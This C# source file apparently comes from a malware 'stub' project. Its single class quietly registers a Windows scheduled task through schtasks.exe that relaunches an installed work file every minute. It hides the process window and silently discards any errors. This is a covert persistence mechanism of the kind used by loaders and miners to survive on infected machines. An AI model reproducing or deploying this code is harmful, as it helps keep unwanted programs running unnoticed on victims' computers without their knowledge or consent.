using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;

namespace Stub.Help
{
    class TaskCreat
    {
        public static Random rnd = new Random();
        public static int value = rnd.Next(2, 7);
        public static void Set()
        {
            try
            {
                string arguments = string.Concat(new string[]
                {
                      "/create /tn " + Config.taskName + " /tr \"", Install.workFile.FullName, "\" /st ", DateTime.Now.AddMinutes(5.0).ToString("HH:mm"), " /du 23:59 /sc daily /ri 1 /f"
                });
                Process.Start(new ProcessStartInfo
                {
                    Arguments = arguments,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "schtasks.exe",
                    RedirectStandardOutput = true,
                    UseShellExecute = false
                });
            }
            catch
            {
            }
        }
    }
}
